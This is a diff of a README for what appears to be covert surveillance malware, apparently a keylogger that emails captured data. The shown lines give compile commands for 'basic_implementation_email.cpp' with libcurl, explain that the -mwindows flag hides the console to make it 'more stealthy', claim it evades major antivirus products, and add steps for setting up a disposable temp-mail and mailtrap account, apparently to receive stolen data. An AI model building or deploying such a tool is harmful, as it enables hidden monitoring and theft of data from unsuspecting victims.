@@ -66,9 +66,7 @@ This implementation has been tested against major antivirus solutions and remain
   ```
 
 ### Building from Source
-1. 
-
-2. Compile the source:
+1. Compile the source:
    ```bash
    # Using MinGW-w64 (recommended for stealth)
    g++ basic_implementation_email.cpp -o iDiags -lcurl -lwinmm -mwindows
@@ -82,10 +80,9 @@ This implementation has been tested against major antivirus solutions and remain
    ```
 
    Note: The `-mwindows` flag prevents the console window from appearing when running the program, making it more stealthy. Remove this flag during development/debugging to see console output.
-
-![Email Setup](images/email.png)
-
+2. Create a temperary mail 
 #### Create Temporary Email Using temp-mail.org
+![Email Setup](images/email.png)
 
 1. Visit mailtrap.io and click "Sign Up"
 2. Choose "Sign up with email" ,you can use temperary email from [temp-mail.org](https://temp-mail.org/)
